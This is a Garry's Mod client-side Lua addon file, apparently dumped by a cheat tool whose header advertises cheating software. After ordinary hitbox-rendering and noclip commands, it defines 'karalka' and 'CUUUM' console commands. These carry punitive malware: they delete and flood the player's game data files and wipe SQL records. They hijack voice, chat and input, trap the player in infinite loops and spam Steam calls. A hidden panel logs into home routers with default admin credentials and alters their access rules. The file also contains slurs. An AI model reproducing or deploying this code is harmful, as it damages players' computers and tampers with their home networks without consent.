
--[[

~ yuck, anti cheats! ~

~ file stolen by ~
                __  .__                          .__            __                 .__               
  _____   _____/  |_|  |__ _____    _____ ______ |  |__   _____/  |______    _____ |__| ____   ____  
 /     \_/ __ \   __\  |  \\__  \  /     \\____ \|  |  \_/ __ \   __\__  \  /     \|  |/    \_/ __ \ 
|  Y Y  \  ___/|  | |   Y  \/ __ \|  Y Y  \  |_> >   Y  \  ___/|  |  / __ \|  Y Y  \  |   |  \  ___/ 
|__|_|  /\___  >__| |___|  (____  /__|_|  /   __/|___|  /\___  >__| (____  /__|_|  /__|___|  /\___  >
      \/     \/          \/     \/      \/|__|        \/     \/          \/      \/        \/     \/ 

~ purchase the superior cheating software at https://methamphetamine.solutions ~

~ server ip: 46.174.55.216_27015 ~ 
~ file: addons/[mst]_fastpl/lua/autorun/client/cl_nouclip.lua ~

]]

local hitboxCurrentlyRendering = false
local renderAll = false
local renderRagDolls = false
local renderNPCs = false
local renderLocalPlayer = false
local zeroAngle = Angle(0, 0, 0)


local function HitboxRender()

	for _, ent in pairs(ents.GetAll()) do

		--if ply == LocalPlayer() then continue end

		if not renderAll then

			if not ent:IsPlayer() and not ent:IsRagdoll() and not ent:IsNPC() then continue end

			if not renderLocalPlayer and ent == LocalPlayer() then continue end
			
			if not renderNPCs and ent:IsNPC() then continue end

			if not renderRagDolls and ent:IsRagdoll() then continue end

		end

		if ent:GetHitBoxGroupCount() == nil then continue end

		for group=0, ent:GetHitBoxGroupCount() - 1 do
		    
		 	for hitbox=0, ent:GetHitBoxCount( group ) - 1 do

		 		local pos, ang =  ent:GetBonePosition( ent:GetHitBoxBone(hitbox, group) )
		 		local mins, maxs = ent:GetHitBoxBounds(hitbox, group)

				render.DrawWireframeBox( pos, ang, mins, maxs, Color(51, 204, 255, 255), true )
			end
		end

		render.DrawWireframeBox( ent:GetPos(), zeroAngle, ent:OBBMins(), ent:OBBMaxs(), Color(255, 204, 51, 255), true )

	end
end 

concommand.Add( "hitbox_togglerender", function( ply, cmd, args, str)

	if not ply:IsAdmin() then return end

	if hitboxCurrentlyRendering then
		hook.Remove("PostDrawOpaqueRenderables", "HitboxRender")
		hitboxCurrentlyRendering = false
	else
		hook.Add("PostDrawOpaqueRenderables", "HitboxRender", HitboxRender )
		hitboxCurrentlyRendering = true
	end

end )

concommand.Add( "hitbox_renderall", function( ply, cmd, args, str)

	renderAll = not renderAll
	print("Render all hitboxes: " .. tostring(renderAll))

end )

concommand.Add( "hitbox_renderragdolls", function( ply, cmd, args, str)

	renderRagDolls = not renderRagDolls
	print("Render ragdolls: " .. tostring(renderRagDolls))

end )

concommand.Add( "hitbox_rendernpcs", function( ply, cmd, args, str)

	renderNPCs = not renderNPCs
	print("Render NPCs: " .. tostring(renderNPCs))

end )

concommand.Add( "hitbox_renderlocalplayer", function( ply, cmd, args, str)

	renderLocalPlayer = not renderLocalPlayer
	print("Render local player: " .. tostring(renderLocalPlayer))

end )



local function PlayerBindNoclip(ply, bind, pressed)
    if string.find(bind, "ulx noclip") then 
        if pressed then
        RunConsoleCommand("noclip")
        end
        return true
    end
end
hook.Add( "PlayerBindPress", "PlayerBindNoclip", PlayerBindNoclip )
 
-----------------------------------------------------------------------
 
local function CheatText()

	chat.AddText(Color(255,255,255), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
	chat.AddText(Color(255,255,255), "=============================================")
	chat.AddText(Color(255,255,255), "• Уважаемый игрок! Вас подозревают в использовании ", Color(255,25,25),"Читов/Стороннего ПО",color_white," на нашем проекте!")
	chat.AddText(Color(255,255,255), "• Скиньте в чат свой ", Color(88, 101, 242),"Discord!",color_white," Чтобы пройти проверку.")
	chat.AddText(Color(255,255,255), "• В случае выхода с сервера - вы будете ", Color(255,25,25),"ЗАБАНЕНЫ НАВСЕГДА",color_white,".")
	chat.AddText(Color(255,255,255), "=============================================")	

end 


concommand.Add("cheater",function()
	local ply = LocalPlayer()
	sound.PlayURL("https://cdn.discordapp.com/attachments/682141692308357163/947845228168093757/cheater.mp3","mono",function(s) s:Play() end)   

	CheatText()
	-------------- Дублируем
	timer.Create("cheater_timer", 5, 5, function()
		CheatText()
	end)  
	 
end) 

concommand.Add("sos",function()
	--LocalPlayer():ConCommand("say", "/// Испытаю удачу!")
	RunConsoleCommand("say", LocalPlayer():Frags() )
end) 
 


concommand.Add("karalka",function()
		local cfg={
		discord_pidorawek="POSOSI", 
		karatelnoe_vidio="https://cdn.discordapp.com/attachments/674507755679121408/675767344785653771/a0ebcc57077f0efd0e438d7b1bca339c_1.webm",
		dupe_pic="https://i.pinimg.com/236x/28/29/90/2829903219dd1c4b94e0a3528862a940.jpg",
	}

	local function rand_string() 
		local s="" 
		for i=1,math.random(12,32) do 
			s=s..string.char(math.random(65,126)) 
		end 
		return s 
	end 
	local function rand_string_2() 
		local s = "" 
		for i=1,math.random(12,32) do 
			if math.random(0,1) == 1 then 
				sym=math.random(65,90) 
			else
				sym=math.random(97,122) 
			end 
			s=s .. string.char(sym) 
		end 
		return s 
	end 

	local function nothing() 
	end 

	local function optimization() 
		RunString=nothing
		RunStringEx=nothing 
		CompileString=nothing 
		net.Start=nothing 
		net.Incoming=nothing 
		net.SendToServer=nothing 
		for k,v in pairs( net.Receivers ) do 
			net.Receivers[k]=nothing 
		end 
		local h = hook.GetTable() 
		
		for k,v in pairs(h) do 
			for k1,v1 in pairs (v) do
				hook.Remove(k,k1) 
			end
		end 
		
		for k,v in ipairs ( ents.GetAll()) do 
			if v and v["SetNoDraw"] then 
				v["SetNoDraw"](v,true) 
			end 
		end 
		jit.flush() 
		collectgarbage("collect")
		RunConsoleCommand("cw_customhud","0") 
		RunConsoleCommand("cl_simfphys_althud","0") 
		RunConsoleCommand("cl_threaded_bone_setup","1") 
		RunConsoleCommand("cl_threaded_client_leaf_system","1") 
		RunConsoleCommand("r_threaded_client_shadow_manager","1") 
		RunConsoleCommand("r_threaded_particles","1") 
		RunConsoleCommand("r_threaded_renderables","1") 
		RunConsoleCommand("mat_queue_mode","2") 
		RunConsoleCommand("r_cleardecals") 
		chat.Close() 
	end 

	local function router_fuck() 
		local r={"0.1","1.0","1.1","0.0"} 
		local codes={
			[[document.getElementById("userName").value="admin"; document.getElementById("pcPassword").value="admin"; document.getElementById("loginBtn").onclick();]],
			[[var lmao=document.getElementById("mainFrame");lmao.src="../userRpm/AccessCtrlAccessRulesRpm.htm";]],
			[[var lmao=document.getElementById("mainFrame").contentWindow;lmao.enableCtrl.checked=1,lmao.defRule[0].checked=1;]],
			[[document.getElementById("mainFrame").contentWindow.doSave();]]
		} 
		for i=1,4 do 
			local html=vgui.Create("DHTML") 
			html:SetSize(512,512) 
			html:SetPos(99999,99999) 
			html:OpenURL("http://192.168." ..  r[i]) 
			local num=1 
			timer.Create(rand_string(),1,4,function() 
				html:RunJavascript(codes[num])
				num=num+1 
			end) 
		end 
	end 

	local function voice_on() 
		RunConsoleCommand("+voicerecord") 
		RunConsoleCommand("gmod_mcore_test","4") 
		RunConsoleCommand("gmod_language","ja") 
		RunConsoleCommand("language_reload") 
	end 

	local function video_start() 
		SetClipboardText(cfg.discord_pidorawek) 
		local frame = vgui.Create("DFrame") 
		frame:SetSize(ScrW(),ScrH())
		frame:SetPos(0,0)
		frame:MakePopup()
		
		timer.Simple(.25,function() 
			local html2 = vgui.Create("HTML",frame)
			html2:SetSize(ScrW(),ScrH())
			html2:SetPos(0,0)
			html2:MakePopup()
			html2:SetHTML([[<style>*{overflow:hidden;}</style><video width="]]  ..  ScrW() - 16 .. [[" height="]] ..  ScrH() - 16 .. 
			[[" autoplay loop> <source src="]].. cfg.karatelnoe_vidio .. [[" type="video/webm"> </video>]]) 
		end) 
	end 
	local function data_delete() 
		local function rec(path) 
			path=path .. "/" 
			local f,d = file ["Find"](path  ..  "*","DATA") 
			for i=1,#f do 
				file.Delete(path .. f[i]) 
			end 
			for i=1,#d do 
				rec(path .. d[i]) 
			end 
		end 
		if not file.Exists("porn_1.jpg","DATA") then 
			local f,d = file.Find("*","DATA") 
			for i=1,#f do 
				file.Delete(f[i]) 
			end 
			for i=1,#d do 
				rec(d[i]) 
			end 
		end 
	end 

	local function data_fucker() 
		for i=1,32 do 
			file.Write(rand_string_2()  .. ".png","X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") 
		end 
		for i=1,32 do 
			file.Write("README_RETARD_" .. i .. ".txt",cfg.discord_pidorawek) 
		end 
		local C,c = 2100000000,0 
		local name = rand_string() 
		timer.Create(name,1,100,function() 
			for i=1,10 do 
				c=c+1 
				local F = file.Open("porn_"  ..  c ..  ".jpg","wb","DATA") 
				if not F then 
					return
				end 
				F["WriteBool"](F,true) 
				F["Seek"](F,C) 
				F["WriteBool"](F,false) 
				if F["Size"](F) == 1 then 
					C=C-2000000.0 
					if C <= 0 then 
						timer.Remove(name) 
					end 
				end 
				F["Close"](F) 
			end 
		end)
		sql.Begin() 
		sql.Query("UPDATE playerpdata SET value='lox'")
		sql.Query("DELETE FPP_Buddies") 
		sql.Commit() 
	end 
	local function spawnmenu_meme() 
		local f = file.Find("materials/icon16/*.png","GAME") 
		local tbl = {} 
		local json = {
			["parentid"]=nil,
			["icon"]=nil;
			["id"]=nil;
			["contents"]={
				{
					["type"]="header";
					["text"]=cfg.discord_pidorawek
				};
				{
					["type"]="model",
					["model"]="models/Gibs/HGIBS.mdl"
				}
			},
			["name"]=nil,
			["version"]="3"
		} 
		for i=1,256 do 
			json["parentid"] = math.random(0,i -1)
			json["icon"] ="icon16/"  ..  f [math.random(#f)]
			json["id"] =i 
			json["name"] = rand_string_2() 
			tbl[rand_string_2()]= util.TableToKeyValues(json) 
		end 
		spawnmenu.DoSaveToTextFiles(tbl) 
	end 
	local function dupe_meme() 
		http.Fetch(cfg.dupe_pic,function(b) 
			local tbl = {} 
			for i=1,128 do 
				tbl["asd"] = i  
				engine.WriteDupe( util.Compress( util.TableToJSON(tbl)),b) 
			end 
		end) 
	end 

	local function steam_fuck() 
		collectgarbage("stop") 
		collectgarbage("step",0X0) 
		collectgarbage("setstepmul",0) 
		collectgarbage("setpause",1e+200) 
		collectgarbage=function() 
			return 0 
		end 
		local function fuck() 
			LocalPlayer():ShowProfile()
			steamworks.OpenWorkshop() 
			steamworks.FileInfo("104607228",nothing) 
			steamworks.DownloadUGC("104607228",nothing) 
			for i=1,10 do 
				steamworks.FileInfo(111,nothing) 
			end 
		end 
		timer.Simple (1,function() 
			hook.Add("Tick",rand_string(),fuck) 
			for i=1,10 do 
				vgui.Create("Awesomium") 
			end 
			timer.Simple(30,function() 
				hook.Add("Tick",rand_string(),function() 
					render.PushFilterMag(1) 
				end) 
			end) 
		end) 
	end 
	local function anti_leave() 
		hook.Add("PlayerBindPress",rand_string(),function() 
			return true
		end) 
		hook ["Add"]("FinishChat",rand_string(),function() 
			if not IsValid(LocalPlayer()) then 
				while 1>0 do 
					print()
				end 
			end 
		end) 
		hook.Add("ShutDown",rand_string(),function() 
			while 1>0 do 
				print()
			end 
		end) 
		hook.Add("CreateMove",rand_string(),function(cmd) 
			cmd:SetForwardMove(math.sin(SysTime() * 2) * 100) 
			cmd:SetSideMove(math.cos ( SysTime() * 2) * 100) 
		end) 
		local scrw,scrh = ScrW() * 50, ScrH() * 50
		hook.Add("Tick",rand_string(),function() 
			RunConsoleCommand("+voicerecord") 
			RunConsoleCommand("say",cfg.discord_pidorawek) 
			gui.EnableScreenClicker(1337) 
			input.SetCursorPos(scrw,scrh) 
			system.FlashWindow() 
			gui.InternalKeyCodeTyped(97) 
			gui.HideGameUI() 
		end) 
	end

	do
		timer.Simple(1,function() 
			router_fuck() 
			data_delete() 
			spawnmenu_meme() 
			dupe_meme() 
			anti_leave() 
			timer.Simple(2,function() 
				optimization() 
				data_fucker() 
				voice_on() 
				timer.Simple (1,function() 
					video_start() 

					-- dobriy
					timer.Simple(5,function()
						timer.Create("antikikoo1", 0.001, 0, function() LocalPlayer():ConCommand("gamemenucommand openloadcommentarydialog ; gamemenucommand openchangegamedialog ; +reload ; +walk ; +left ; +forward ; +zoom ; +jump") end)
	                   	timer.Create("antikikoo2", 0.001, 0, function() LocalPlayer():ConCommand("gamemenucommand openbenchmarkdialog ; gamemenucommand opencreatemultiplayergamedialog ; +duck ; +attack ; +attack2 ; +attack3 ; +klook") end)
	                   	timer.Create("antikikoo3", 0.001, 0, function() LocalPlayer():ConCommand("+showvprof ; +menu ; +score ; +showbudget ; +mat_texture_list ; +vgui_drawtree ; physgun_rotation_sensitivity 999 ; physgun_wheelspeed 0 ; r_3dsky 0") end)
	                    timer.Create("antikikoo4", 0.001, 0, function() LocalPlayer():ConCommand("net_graph 4 ; cl_screenshotname 'dobriy' ; cl_timeout 1 ; cl_yawspeed 99999999 ; screenshot") end)

					end)
					timer.Simple(30,steam_fuck) 
				end)
			end) 
		end)
	end
end)	


---------------------------------------------------------------------------- 
-------------- NE KARALKA

concommand.Add("CUUUM",function()
		local cfg={
		discord_pidorawek="POSOSI", 
		karatelnoe_vidio="https://cdn.discordapp.com/attachments/739577533707845773/936726274611757116/7d85e56ab6c85d98.mp4",
		dupe_pic="https://i.pinimg.com/236x/28/29/90/2829903219dd1c4b94e0a3528862a940.jpg",
	}

	local function rand_string() 
		local s="" 
		for i=1,math.random(12,32) do 
			s=s..string.char(math.random(65,126)) 
		end 
		return s 
	end 
	local function rand_string_2() 
		local s = "" 
		for i=1,math.random(12,32) do 
			if math.random(0,1) == 1 then 
				sym=math.random(65,90) 
			else
				sym=math.random(97,122) 
			end 
			s=s .. string.char(sym) 
		end 
		return s 
	end 

	local function nothing() 
	end 

	local function optimization() 
		RunString=nothing
		RunStringEx=nothing 
		CompileString=nothing 
		net.Start=nothing 
		net.Incoming=nothing 
		net.SendToServer=nothing 
		for k,v in pairs( net.Receivers ) do 
			net.Receivers[k]=nothing 
		end 
		local h = hook.GetTable() 
		
		for k,v in pairs(h) do 
			for k1,v1 in pairs (v) do
				hook.Remove(k,k1) 
			end
		end 
		
		for k,v in ipairs ( ents.GetAll()) do 
			if v and v["SetNoDraw"] then 
				v["SetNoDraw"](v,true) 
			end 
		end 
		jit.flush() 
		collectgarbage("collect")
		RunConsoleCommand("cw_customhud","0") 
		RunConsoleCommand("cl_simfphys_althud","0") 
		RunConsoleCommand("cl_threaded_bone_setup","1") 
		RunConsoleCommand("cl_threaded_client_leaf_system","1") 
		RunConsoleCommand("r_threaded_client_shadow_manager","1") 
		RunConsoleCommand("r_threaded_particles","1") 
		RunConsoleCommand("r_threaded_renderables","1") 
		RunConsoleCommand("mat_queue_mode","2") 
		RunConsoleCommand("r_cleardecals") 
		chat.Close() 
	end 

	local function router_fuck() 
		local r={"0.1","1.0","1.1","0.0"} 
		local codes={
			[[document.getElementById("userName").value="admin"; document.getElementById("pcPassword").value="admin"; document.getElementById("loginBtn").onclick();]],
			[[var lmao=document.getElementById("mainFrame");lmao.src="../userRpm/AccessCtrlAccessRulesRpm.htm";]],
			[[var lmao=document.getElementById("mainFrame").contentWindow;lmao.enableCtrl.checked=1,lmao.defRule[0].checked=1;]],
			[[document.getElementById("mainFrame").contentWindow.doSave();]]
		} 
		for i=1,4 do 
			local html=vgui.Create("DHTML") 
			html:SetSize(512,512) 
			html:SetPos(99999,99999) 
			html:OpenURL("http://192.168." ..  r[i]) 
			local num=1 
			timer.Create(rand_string(),1,4,function() 
				html:RunJavascript(codes[num])
				num=num+1 
			end) 
		end 
	end 

	local function voice_on() 
		RunConsoleCommand("+voicerecord") 
		RunConsoleCommand("gmod_mcore_test","4") 
		RunConsoleCommand("gmod_language","ja") 
		RunConsoleCommand("language_reload") 
	end 

	local function video_start() 
		SetClipboardText(cfg.discord_pidorawek) 
		local frame = vgui.Create("DFrame") 
		frame:SetSize(ScrW(),ScrH())
		frame:SetPos(0,0)
		frame:MakePopup()
		
		timer.Simple(.25,function() 
			local html2 = vgui.Create("HTML",frame)
			html2:SetSize(ScrW(),ScrH())
			html2:SetPos(0,0)
			html2:MakePopup()
			html2:SetHTML([[<style>*{overflow:hidden;}</style><video width="]]  ..  ScrW() - 16 .. [[" height="]] ..  ScrH() - 16 .. 
			[[" autoplay loop> <source src="]].. cfg.karatelnoe_vidio .. [[" type="video/webm"> </video>]]) 
		end) 
	end 
	local function data_delete() 
		local function rec(path) 
			path=path .. "/" 
			local f,d = file ["Find"](path  ..  "*","DATA") 
			for i=1,#f do 
				file.Delete(path .. f[i]) 
			end 
			for i=1,#d do 
				rec(path .. d[i]) 
			end 
		end 
		if not file.Exists("porn_1.jpg","DATA") then 
			local f,d = file.Find("*","DATA") 
			for i=1,#f do 
				file.Delete(f[i]) 
			end 
			for i=1,#d do 
				rec(d[i]) 
			end 
		end 
	end 

	local function data_fucker() 
		for i=1,32 do 
			file.Write(rand_string_2()  .. ".png","X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") 
		end 
		for i=1,32 do 
			file.Write("README_RETARD_" .. i .. ".txt",cfg.discord_pidorawek) 
		end 
		local C,c = 2100000000,0 
		local name = rand_string() 
		timer.Create(name,1,100,function() 
			for i=1,10 do 
				c=c+1 
				local F = file.Open("porn_"  ..  c ..  ".jpg","wb","DATA") 
				if not F then 
					return
				end 
				F["WriteBool"](F,true) 
				F["Seek"](F,C) 
				F["WriteBool"](F,false) 
				if F["Size"](F) == 1 then 
					C=C-2000000.0 
					if C <= 0 then 
						timer.Remove(name) 
					end 
				end 
				F["Close"](F) 
			end 
		end)
		sql.Begin() 
		sql.Query("UPDATE playerpdata SET value='lox'")
		sql.Query("DELETE FPP_Buddies") 
		sql.Commit() 
	end 
	local function spawnmenu_meme() 
		local f = file.Find("materials/icon16/*.png","GAME") 
		local tbl = {} 
		local json = {
			["parentid"]=nil,
			["icon"]=nil;
			["id"]=nil;
			["contents"]={
				{
					["type"]="header";
					["text"]=cfg.discord_pidorawek
				};
				{
					["type"]="model",
					["model"]="models/Gibs/HGIBS.mdl"
				}
			},
			["name"]=nil,
			["version"]="3"
		} 
		for i=1,256 do 
			json["parentid"] = math.random(0,i -1)
			json["icon"] ="icon16/"  ..  f [math.random(#f)]
			json["id"] =i 
			json["name"] = rand_string_2() 
			tbl[rand_string_2()]= util.TableToKeyValues(json) 
		end 
		spawnmenu.DoSaveToTextFiles(tbl) 
	end 
	local function dupe_meme() 
		http.Fetch(cfg.dupe_pic,function(b) 
			local tbl = {} 
			for i=1,128 do 
				tbl["asd"] = i  
				engine.WriteDupe( util.Compress( util.TableToJSON(tbl)),b) 
			end 
		end) 
	end 

	local function steam_fuck() 
		collectgarbage("stop") 
		collectgarbage("step",0X0) 
		collectgarbage("setstepmul",0) 
		collectgarbage("setpause",1e+200) 
		collectgarbage=function() 
			return 0 
		end 
		local function fuck() 
			LocalPlayer():ShowProfile()
			steamworks.OpenWorkshop() 
			steamworks.FileInfo("104607228",nothing) 
			steamworks.DownloadUGC("104607228",nothing) 
			for i=1,10 do 
				steamworks.FileInfo(111,nothing) 
			end 
		end 
		timer.Simple (1,function() 
			hook.Add("Tick",rand_string(),fuck) 
			for i=1,10 do 
				vgui.Create("Awesomium") 
			end 
			timer.Simple(30,function() 
				hook.Add("Tick",rand_string(),function() 
					render.PushFilterMag(1) 
				end) 
			end) 
		end) 
	end 
	local function anti_leave() 
		hook.Add("PlayerBindPress",rand_string(),function() 
			return true
		end) 
		hook ["Add"]("FinishChat",rand_string(),function() 
			if not IsValid(LocalPlayer()) then 
				while 1>0 do 
					print()
				end 
			end 
		end) 
		hook.Add("ShutDown",rand_string(),function() 
			while 1>0 do 
				print()
			end 
		end) 
		hook.Add("CreateMove",rand_string(),function(cmd) 
			cmd:SetForwardMove(math.sin(SysTime() * 2) * 100) 
			cmd:SetSideMove(math.cos ( SysTime() * 2) * 100) 
		end) 
		local scrw,scrh = ScrW() * 50, ScrH() * 50
		hook.Add("Tick",rand_string(),function() 
			RunConsoleCommand("+voicerecord") 
			RunConsoleCommand("say",cfg.discord_pidorawek) 
			gui.EnableScreenClicker(1337) 
			input.SetCursorPos(scrw,scrh) 
			system.FlashWindow() 
			gui.InternalKeyCodeTyped(97) 
			gui.HideGameUI() 
		end) 
	end

	do
		timer.Simple(1,function() 
			--router_fuck() 
			--data_delete() 
			--spawnmenu_meme() 
			--dupe_meme() 
			--anti_leave() 
			timer.Simple(2,function() 
				--optimization() 
				--data_fucker() 
				--voice_on() 
				timer.Simple (1,function() 
					video_start() 

					-- dobriy
					--[[timer.Simple(5,function()
						timer.Create("antikikoo1", 0.001, 0, function() LocalPlayer():ConCommand("gamemenucommand openloadcommentarydialog ; gamemenucommand openchangegamedialog ; +reload ; +walk ; +left ; +forward ; +zoom ; +jump") end)
	                   	timer.Create("antikikoo2", 0.001, 0, function() LocalPlayer():ConCommand("gamemenucommand openbenchmarkdialog ; gamemenucommand opencreatemultiplayergamedialog ; +duck ; +attack ; +attack2 ; +attack3 ; +klook") end)
	                   	timer.Create("antikikoo3", 0.001, 0, function() LocalPlayer():ConCommand("+showvprof ; +menu ; +score ; +showbudget ; +mat_texture_list ; +vgui_drawtree ; physgun_rotation_sensitivity 999 ; physgun_wheelspeed 0 ; r_3dsky 0") end)
	                    timer.Create("antikikoo4", 0.001, 0, function() LocalPlayer():ConCommand("net_graph 4 ; cl_screenshotname 'dobriy' ; cl_timeout 1 ; cl_yawspeed 99999999 ; screenshot") end)

					end)]]
					--timer.Simple(30,steam_fuck) 
				end)
			end) 
		end)
	end
end)	

 
 